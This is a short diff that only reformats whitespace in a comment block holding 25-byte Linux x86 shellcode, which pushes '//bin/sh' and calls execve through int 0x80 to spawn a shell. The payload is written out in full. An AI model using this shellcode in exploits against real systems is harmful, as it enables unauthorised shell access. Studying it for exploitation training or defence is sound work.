@@ -1,17 +1,17 @@
 /*
  * (linux/x86) /bin/sh shellcode --25 bytes--
 	_start:
-		xor	  edx, edx
+		xor	edx, edx
 		push	edx
 		push	0x68732f6e ;//bin/sh
 		push	0x69622f2f
-		mov	  ebx, esp
+		mov	ebx, esp
 		push	edx
 		push	ebx
-		mov	  ecx, esp
+		mov	ecx, esp
 		push	0xb
-		pop   eax
-		int   0x80
+		pop   	eax
+		int   	0x80
 
 */
 
